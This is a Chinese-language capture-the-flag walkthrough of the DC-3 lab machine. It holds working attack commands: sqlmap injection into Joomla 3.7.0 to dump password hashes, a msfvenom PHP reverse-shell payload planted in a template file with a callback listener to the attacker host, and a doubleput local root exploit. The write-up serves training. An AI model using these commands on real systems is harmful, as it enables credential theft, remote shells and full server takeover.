@@ -1,0 +1,230 @@
+
+# 0x00环境
+
+攻击机：kali（192.168.1.28）
+
+靶机：DC-3（192.168.1.）
+
+
+# 0x01实战
+
+
+## 端口扫描
+
+```
+nmap -sV -A -p- 192.168.1.11
+```
+
+![image-20220110203517991.png](./assets/1652256194361-2524b082-b229-477f-b617-b79465006747.png)
+
+可以看到目标机开放了80端口HTTP服务
+
+
+## 目录扫描
+
+可以看到网站后台路径
+
+![image-20220110204506347.png](./assets/1652256198478-a01eb2d4-dbd3-45af-ba37-9c16481360b7.png)
+
+在浏览器访问网站后台，通过标题可以发现使用的是joomla搭建的站点
+
+![image-20220110204514438.png](./assets/1652256202188-c8f13d83-e81c-4597-ae1c-53c8374f3b2d.png)
+
+
+## 漏洞扫描
+
+已经知道是使用的joomla搭建的站点那么使用joomscan扫描站点
+
+[不知道什么是joomscan?点这里](https://www.freebuf.com/sectool/181440.html)
+
+```
+joomscan --url http://192.168.1.11
+```
+
+![image-20220110204557133.png](./assets/1652256207763-5a96fe0a-fbc1-45a4-88dc-80925012127d.png)
+
+从结果可以看到 joomla的版本是 3.7.0
+
+查看joomla 3.7.0的漏洞有哪些
+
+```
+searchsploit joomla 3.7.0
+```
+
+![image-20220110204618326.png](./assets/1652256212029-e0578894-125c-4994-895a-8c6e4565b027.png)
+
+可以发现joomla 3.7.0 存在SQL注入漏洞
+
+查看42033.txt的内容
+
+![image-20220110204807674.png](./assets/1652256215174-262be897-e1a4-4d75-a437-693ffc318999.png)
+
+文档中指出可以使用sqlmap进行注入 并将参数列了出来
+
+
+## 漏洞利用
+
+使用sqlmap扫描，暴库
+
+```
+sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+
+![image-20220110205106024.png](./assets/1652256221047-9a27c003-22a5-4e97-9492-e2f20d8c9f9b.png)
+
+爆表
+
+```
+sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
+```
+
+![image-20220110205257745.png](./assets/1652256225003-39ef2db6-b0cd-4eaf-a561-b915f46b3045.png)
+
+爆字段
+
+```
+sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" --columns -p list[fullordering]
+```
+
+![image-20220110205625696.png](./assets/1652256228844-accac433-9b27-4402-b76d-a2edf7d670b9.png)
+
+拖库
+
+```
+sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C "name,password" --dump -p list[fullordering]
+```
+
+![image-20220110205722192.png](./assets/1652256232749-97da86f2-c589-44cb-8b56-0679427cae83.png)
+
+得到了admin和密码的哈希值
+
+将密码存入文件password中使用john破解
+
+```
+john password
+```
+
+![image-20220110205855317.png](./assets/1652256235949-5385e53e-a1f4-4278-a5b7-f5e96ec0322b.png)
+
+得到了密码snoopy
+
+登陆后台
+
+![image-20220110205928274.png](./assets/1652256239394-868519b5-9676-490c-ba25-ee24799dd107.png)
+
+在template栏中发现可以写文件，我们可以写一个木马上去
+
+![image-20220110210247843.png](./assets/1652256243049-30ea4c2a-4e93-4cd8-856f-ebf61b7fa98d.png)
+
+
+## 反弹shell
+
+使用msfvenom生成一个php木马文件
+
+```
+msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.1.28 port=4444 -f raw
+```
+
+![image-20220110211818024.png](./assets/1652256247617-e4d301bb-cd3a-40c0-a4e3-056439f82c67.png)
+
+将error.php文件内容替换为生成的木马内容保存
+
+![image-20220110212201986.png](./assets/1652256253133-deb863e1-4346-4f62-9d00-790587b2d0f4.png)
+
+创建监听
+
+```
+┌──(root💀kali)-[~]
+└─# msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 192.168.1.28
+msf6 exploit(multi/handler) > set lport 4444
+msf6 exploit(multi/handler) > run
+```
+
+在浏览器中访问木马文件就得知道木马文件所在的位置
+
+![image-20220110212256338.png](./assets/1652256256478-508db622-e3cd-4ba3-90ca-1e596c893675.png)
+
+```
+http://192.168.1.11/templates/beez3/error.php
+```
+
+成功反弹shell
+
+![image-20220110212314866.png](./assets/1652256260909-c8134e9a-0cd8-46b6-b8ca-68d51ef866fa.png)
+
+
+## 提权
+
+进入shell，并使界面看起来正常
+
+```
+shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+![image-20220110212754433.png](./assets/1652256265639-360a7de5-7ddf-42f4-9e31-756a84577f5e.png)
+
+查看系统版本
+
+```
+cat /proc/version
+cat /etc/issue
+```
+
+![image-20220110212917909.png](./assets/1652256268955-c5c8557f-12a0-40ca-b4c9-a0255e0bafb1.png)
+
+查找Ubuntu16.04的提权漏洞
+
+```
+searchsploit Ubuntu 16.04
+```
+
+![image-20220110213039355.png](./assets/1652256272323-7313e9ba-e1be-4480-9240-bb4e085a4746.png)
+
+查看39772.txt的内容
+
+```
+cat /usr/share/exploitdb/exploits/linux/local/39772.txt
+```
+
+在文末可以看到利用方法和下载地址
+
+![image-20220110213400265.png](./assets/1652256276825-892161df-ddbd-49a5-9c92-8520e17135a9.png)
+
+将文件下载到攻击机中并上传到靶机的/tmp目录
+
+```
+upload /root/39772.zip /tmp
+```
+
+![image-20220110213852195.png](./assets/1652256281364-6e58070c-b239-4fc3-a365-942085999709.png)
+
+进入shell解压
+
+![image-20220110214210063.png](./assets/1652256288370-c9dd8843-b368-4955-8917-667e3dc8984b.png)
+
+编译
+
+```
+./compile.sh
+```
+
+![image-20220110214359617.png](./assets/1652256292932-3a493d4f-be09-4c8e-8ea9-40ad401420c8.png)
+
+提权
+
+```
+./doubleput
+```
+
+![image-20220110214703808.png](./assets/1652256299833-34e131d2-c760-4774-9cbd-ef8f85b664eb.png)
+
+
+## final-flag
+
+在rootg根目录下找到flag
+
+![image-20220110214935672.png](./assets/1652256305412-6b1fa477-4ba3-4204-98c2-b4c8fda8b770.png)
